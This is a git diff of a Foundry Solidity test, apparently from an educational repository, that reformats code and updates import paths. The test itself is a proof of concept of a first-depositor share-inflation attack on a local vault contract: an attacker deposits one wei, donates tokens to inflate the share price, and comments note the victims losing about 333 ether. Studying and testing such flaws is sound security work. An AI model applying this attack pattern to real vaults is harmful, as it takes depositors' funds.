@@ -22,16 +22,13 @@
   asset/share:  1
 */
 
-
-
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.13;
 
 import {Test, console2} from "forge-std/Test.sol";
-import {PPSwap} from "../..//src/first-depositor-attack/PPSwap.sol";
-import {PPSVault} from "../../src/first-depositor-attack/PPSVault.sol";
-import {PPSVaultFactory} from "../../src/first-depositor-attack/PPSVaultFactory.sol";
-
+import {PPSwap} from "../..//src/003-first-depositor-attack/PPSwap.sol";
+import {PPSVault} from "../../src/003-first-depositor-attack/PPSVault.sol";
+import {PPSVaultFactory} from "../../src/003-first-depositor-attack/PPSVaultFactory.sol";
 
 contract PPSVaultTest is Test {
     PPSwap ppswap;
@@ -48,17 +45,20 @@ contract PPSVaultTest is Test {
         ppswap.transfer(firstDepositor, 2000 ether);
         ppswap.transfer(victim1, 2000 ether);
         ppswap.transfer(victim2, 2000 ether);
-         
+
         vm.prank(deployer);
         ppsvFactory = new PPSVaultFactory();
-        ppsv =  ppsvFactory.deployPPSVault(address(ppswap));
+        ppsv = ppsvFactory.deployPPSVault(address(ppswap));
     }
 
     function testFirstDepositorAttack() public {
         vm.startPrank(firstDepositor);
         ppswap.approve(address(ppsv), 1);
         ppsv.deposit(1, firstDepositor); // amount, receiver
-        console2.log("first depositor balance of ppsv", ppsv.balanceOf(firstDepositor));
+        console2.log(
+            "first depositor balance of ppsv",
+            ppsv.balanceOf(firstDepositor)
+        );
         console2.log("asset/share: ", ppsv.previewRedeem(1));
 
         // first depositor donate 1000 ether to inflate price per share
@@ -74,7 +74,7 @@ contract PPSVaultTest is Test {
         console2.log("asset/share: ", ppsv.previewRedeem(1));
         vm.stopPrank();
 
-         // victim 2 deposit 
+        // victim 2 deposit
         vm.startPrank(victim2);
         ppswap.approve(address(ppsv), 2000 ether);
         ppsv.deposit(2000 ether, victim2); // amount, receiver
@@ -83,17 +83,20 @@ contract PPSVaultTest is Test {
         vm.stopPrank();
 
         console2.log("\n withdrawing....");
-        
-        // first depositor withdraw 
+
+        // first depositor withdraw
         vm.startPrank(firstDepositor);
         ppsv.approve(address(ppsv), 1);
         ppsv.redeem(1, firstDepositor, firstDepositor); // amount, receiver, owner
         // he gained 666 ether below
-        console2.log("first depositor balance of PPswap", ppswap.balanceOf(firstDepositor));
+        console2.log(
+            "first depositor balance of PPswap",
+            ppswap.balanceOf(firstDepositor)
+        );
         console2.log("asset/share: ", ppsv.previewRedeem(1));
         vm.stopPrank();
 
-        // victim1  withdraw 
+        // victim1  withdraw
         vm.startPrank(victim1);
         ppsv.redeem(1, victim1, victim1); // amount, receiver, owner
         // he gained 1250 ether below
@@ -102,7 +105,7 @@ contract PPSVaultTest is Test {
         console2.log("asset/share: ", ppsv.previewRedeem(1));
         vm.stopPrank();
 
-        // victim2  withdraw 
+        // victim2  withdraw
         vm.startPrank(victim2);
         ppsv.redeem(1, victim2, victim2); // amount, receiver, owner
         // he gained 1250 ether below
@@ -110,7 +113,5 @@ contract PPSVaultTest is Test {
         // lost around 333 ether
         console2.log("asset/share: ", ppsv.previewRedeem(1));
         vm.stopPrank();
-
     }
-
 }
